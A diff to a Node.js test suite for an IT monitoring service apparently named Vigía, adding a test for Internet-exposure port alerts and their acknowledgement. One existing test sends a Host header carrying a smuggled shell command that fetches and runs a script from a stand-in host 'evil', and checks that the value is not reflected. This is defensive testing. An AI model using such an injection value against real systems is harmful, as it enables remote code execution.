@@ -49,7 +49,7 @@ before(async () => {
     OLLAMA_MODEL: 'mock-model', OLLAMA_URL: `http://127.0.0.1:${auxPort}`,
     SMTP_HOST: '127.0.0.1', SMTP_PORT: String(smtpPort), SMTP_USER: 'mailer', SMTP_PASS: 'mail-pass', MAIL_FROM: 'Vigía <vigia@it.example>', MAIL_TO: 'tech@it.example, boss@it.example',
     VIGIA_INV: path.join(dir, 'inventory.json'), VIGIA_STATE: path.join(dir, 'state.json'), VIGIA_PUSHED: path.join(dir, 'pushed.json'), VIGIA_WORDFENCE: path.join(dir, 'wf.json'),
-    VIGIA_CLIENTS: path.join(dir, 'clients.json'), VIGIA_CLIENT_MAIL_MS: '150', VIGIA_CLIENT_GAP_MS: '300',
+    VIGIA_CLIENTS: path.join(dir, 'clients.json'), VIGIA_CLIENT_MAIL_MS: '150', VIGIA_CLIENT_GAP_MS: '300', PUBLIC_IP_URL: 'off', VIGIA_EXPOSURE_ALLOW_PRIVATE: 'true',
   }));
 });
 after(() => { srv?.kill(); aux?.close(); smtp?.server.close(); fs.rmSync(dir, { recursive: true, force: true }); });
@@ -201,6 +201,37 @@ test('computers: install line, enrolment, signed Windows inventory, findings', a
   const bad = await new Promise(res => http.request({ host: '127.0.0.1', port, path: '/api/enroll-token', method: 'POST',
     headers: { ...J, host: "x';curl evil|sh;'" } }, r => { let d = ''; r.on('data', c => { d += c; }).on('end', () => res(d)); }).end(JSON.stringify({ client: 'A' })));
   assert.ok(!bad.includes('evil'));
+});
+
+test('Internet exposure: only the ports the computer listens on, open ones alert, acknowledging accepts', async () => {
+  const J = { ...auth, 'content-type': 'application/json' };
+  const t = await (await fetch(url('/api/enroll-token'), { method: 'POST', headers: J, body: JSON.stringify({ client: 'ACME' }) })).json();
+  const machineId = crypto.createHash('sha256').update('guid-srv').digest('hex');
+  const e = await (await fetch(url('/api/enroll'), { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ token: t.token, host: 'SRV', machineId }) })).json();
+  const closed = await freePort(), p = `/api/inventory/${e.asset}`;
+  const push = async (ts, ports) => {
+    const body = JSON.stringify({ host: 'SRV', parts: [{ kind: 'network', publicIp: '127.0.0.1' },
+      { kind: 'listening', ports: ports.map(port => ({ proto: 'tcp', addr: '0.0.0.0', port, process: 'node' })) }] });
+    return (await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts), 'x-vigia-signature': sign(e.key, ts, p, body) }, body })).status;
+  };
+  const ts = Math.floor(Date.now() / 1000);
+  assert.equal(await push(ts, [auxPort, closed]), 200);
+  const key = `expo:${e.asset}:${auxPort}`;
+  let S;
+  for (let i = 0; i < 40; i++) { S = await (await fetch(url('/api/state'), { headers: auth })).json(); if (S.alerts.some(a => a.key === key)) break; await new Promise(r => setTimeout(r, 100)); }
+  const al = S.alerts.find(a => a.key === key);
+  assert.ok(al, 'the open port alerts');
+  assert.equal(al.prio, 'P3');
+  assert.match(al.title, /reachable from the Internet \(127\.0\.0\.1:\d+\)/);
+  assert.ok(!S.alerts.some(a => a.key === `expo:${e.asset}:${closed}`), 'the closed port does not');
+  assert.deepEqual(S.pushed[e.asset].machine.exposed, [auxPort]);
+  // acknowledging accepts it: the next push does not raise it again
+  await fetch(url(`/api/ack?key=${encodeURIComponent(key)}`), { method: 'POST', headers: auth });
+  assert.equal(await push(ts + 1, [auxPort, closed]), 200);
+  await new Promise(r => setTimeout(r, 1200));
+  S = await (await fetch(url('/api/state'), { headers: auth })).json();
+  assert.ok(!S.alerts.some(a => a.key === key));
+  await fetch(url(`/api/assets/${e.asset}`), { method: 'DELETE', headers: J, body: JSON.stringify({ rev: (await (await fetch(url('/api/inventory'), { headers: auth })).json()).rev }) });
 });
 
 test('client portal: signed link, only that client, report, revocable', async () => {
